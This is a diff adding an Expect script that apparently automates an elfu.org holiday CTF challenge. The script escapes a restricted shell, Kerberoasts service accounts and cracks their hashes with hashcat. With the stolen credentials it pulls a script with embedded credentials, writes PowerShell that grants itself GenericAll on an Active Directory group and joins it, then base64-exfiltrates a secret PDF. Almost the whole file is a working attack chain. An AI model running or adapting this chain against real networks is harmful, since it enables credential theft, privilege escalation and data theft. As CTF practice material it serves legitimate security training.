@@ -1,0 +1,148 @@
+#!/usr/bin/expect
+
+set myuser [lindex $argv 0];
+set mypass [lindex $argv 1];
+set verbose 0
+if { [lindex $argv 2] == "-v" } { set verbose 1 }
+
+if { $myuser=="" || $mypass== "" } { send_user "Usage: $argv0 username password \[-v]\n"; exit }
+
+set green "\033\[32m"
+set red "\033\[31m"
+set gray "\033\[37m"
+set cyan "\033\[36m"
+log_user $verbose
+set max_match 800000
+
+send_user "${cyan}#\n# Kerberoboting in progress - get a brew and lean back\n#\n\n"
+send_user "${green}Retrieving the wordlist from register.elfu.org using CeWL\n"
+spawn ./cewl.rb https://register.elfu.org/register --with-numbers -w wordlist
+send_user "Retrieving the OneRuleToRuleThemAll rule for Hashcat\n"
+spawn curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
+set timeout 20
+set chan [ open spn.txt w]
+send_user "Logging on to grades.elfu.org using SSH\n"
+spawn ssh $myuser@grades.elfu.org -p 2222
+set ssh_id $spawn_id
+expect ".*password: "
+send "$mypass\r"
+expect -re "(...): "
+if { $expect_out(1,string) == "ord" } {
+  send_user "${red}unable to login. The check your credentials\n"
+  exit
+}
+
+send_user "Escaping the application using <EOF>\n";
+send ""
+expect ">>> "
+send_user "Escaping the Python shell using os.system('bash')\n"
+send "os.system('bash')\r"
+expect "*$ "
+send_user "These shares are available on the file server\n"
+log_user 1
+send_user $gray
+send "smbclient -L '\\\\10.128.3.30'\r"
+expect "password: "
+send "$mypass\r"
+expect "*$ "
+send_user $green
+log_user $verbose
+send_user "Running GetUserSPNs.py using my user id to enumerate SPNs linked to user accounts and get their password hashes\n"
+send "python3 /usr/local/bin/GetUserSPNs.py -dc-ip 10.128.1.53 'elfu.local/$myuser:$mypass' -request | grep --color=never krb5tgs\r"
+expect -i $ssh_id "krb5tgs\r\n"
+expect -i $ssh_id -re "(.*)\r"
+puts $chan "$expect_out(1,string)\n"
+close $chan
+spawn rm spn.txt.password
+send_user "Running Hashcat to crack the password\n"
+spawn hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist --outfile spn.txt.password --outfile-format 2
+set hashcat_id $spawn_id
+expect "Stopped:"
+spawn cat spn.txt.password
+set cat_id $spawn_id
+expect -i $cat_id -re "^(.*)\r"
+set password $expect_out(1,string)
+send_user "  ok. Password is ${cyan}${password}${green}\n"
+spawn sed -n "s/.*\\$\\*\\(\[a-z_\]*\\)\\$.*/\\1/p" spn.txt
+set grep_id $spawn_id
+expect -i $grep_id -re "^(.*)\r"
+set user $expect_out(1,string)
+send_user "Getting access to samba \\\\10.128.3.30\\elfu_svc_shr share as user elfu_svc\n"
+send -i $ssh_id "smbclient -U $user '\\\\10.128.3.30\\elfu_svc_shr'\r"
+expect -i $ssh_id ".*password: "
+send -i $ssh_id "$password\r"
+expect -i $ssh_id "*> "
+send_user "Obtaining file GetProcessInfo.ps1 which has credentials for remote_elf embedded\n"
+send -i $ssh_id "get GetProcessInfo.ps1\r"
+expect -i $ssh_id "*> "
+send -i $ssh_id "quit\r"
+expect -i $ssh_id "*$ "
+send_user "Granting myself GenericAll permissions on AD group Research Department and adding myself to it\n"
+send -i $ssh_id "head -3 GetProcessInfo.ps1 > getaccess.ps1; cat <<EOF >>getaccess.ps1
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { 
+Add-Type -AssemblyName System.DirectoryServices
+\\\$ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\"
+\\\$nullGUID = \[guid\]'00000000-0000-0000-0000-000000000000'
+\\\$propGUID = \[guid\]'00000000-0000-0000-0000-000000000000'
+\\\$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"elfu.local\\$myuser\")).Translate(\[System.Security.Principal.SecurityIdentifier\])
+\\\$inheritanceType = \[System.DirectoryServices.ActiveDirectorySecurityInheritance\]::None
+\\\$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule \\\$IdentityReference, (\[System.DirectoryServices.ActiveDirectoryRights\] \"GenericAll\"), (\[System.Security.AccessControl.AccessControlType\] \"Allow\"), \\\$propGUID, \\\$inheritanceType, \\\$nullGUID
+\\\$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry \\\$ldapConnString
+\\\$secOptions = \\\$domainDirEntry.get_Options()
+\\\$secOptions.SecurityMasks = \[System.DirectoryServices.SecurityMasks\]::Dacl
+\\\$domainDirEntry.RefreshCache()
+\\\$domainDirEntry.get_ObjectSecurity().AddAccessRule(\\\$ACE)
+\\\$domainDirEntry.CommitChanges()
+\\\$domainDirEntry.dispose()
+
+\\\$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry \\\$ldapConnString, $myuser, $mypass
+\\\$b=New-Object byte\[\] \\\$IdentityReference.BinaryLength
+\\\$IdentityReference.GetBinaryForm(\\\$b,0)
+\\\$hexSID=\[BitConverter\]::ToString(\\\$b).Replace('-','')
+\\\$domainDirEntry.Add(\"LDAP://<SID=\\\$hexSID>\")
+\\\$domainDirEntry.CommitChanges()
+\\\$domainDirEntry.dispose()
+} -Credential \\\$aCred -Authentication Negotiate
+EOF\r"
+expect -i $ssh_id "*$ "
+send -i $ssh_id "powershell getaccess.ps1\r"
+expect -i $ssh_id "*$ "
+send_user "Getting access to samba \\\\10.128.3.30\\research_dep using my user id\n"
+while { true } {
+  send -i $ssh_id "smbclient '\\\\10.128.3.30\\research_dep'\r"
+  expect -i $ssh_id "password: "
+  send -i $ssh_id "$mypass\r"
+  expect -i $ssh_id -re ".*(\[$>] )"
+  if { $expect_out(1,string) == "> " } {
+    break
+  }
+  send_user "> still waiting for AD replication. Please standby.\n"
+  sleep 10
+}
+log_user 1
+send_user $gray
+send -i $ssh_id "dir\r"
+expect -i $ssh_id "*> "
+send_user $green
+log_user $verbose
+send_user "Getting file SantaSecretToAWonderfulHolidaySeason.pdf\n"
+send -i $ssh_id "get SantaSecretToAWonderfulHolidaySeason.pdf\r"
+expect -i $ssh_id "*> "
+send -i $ssh_id "quit\r"
+expect -i $ssh_id "*$ "
+set santa [ open SantaSecretToAWonderfulHolidaySeason.pdf.b64 w]
+send_user "Transferring file SantaSecretToAWonderfulHolidaySeason.pdf to local machine\n"
+send -i $ssh_id "base64 SantaSecretToAWonderfulHolidaySeason.pdf;echo __END__\r"
+expect -i $ssh_id -re ".*__END__\r\n"
+while { true } {
+  # expect -i $ssh_id -re "^(.*\r)"
+  expect -i $ssh_id -re "^(\[^\r\n]*\r\n)"
+  if { $expect_out(1,string) == "__END__\r\n" } { break }
+  puts -nonewline $santa $expect_out(1,string)
+}
+close $santa
+#spawn base64 -di SantaSecretToAWonderfulHolidaySeason.pdf.b64 > SantaSecretToAWonderfulHolidaySeason.pdf
+spawn openssl enc -d -base64 -in SantaSecretToAWonderfulHolidaySeason.pdf.b64 -out SantaSecretToAWonderfulHolidaySeason.pdf
+send_user "${cyan}\n#\n# Have fun and explore more\n#\n"
+send -i $ssh_id "\r"
+interact -i $ssh_id 
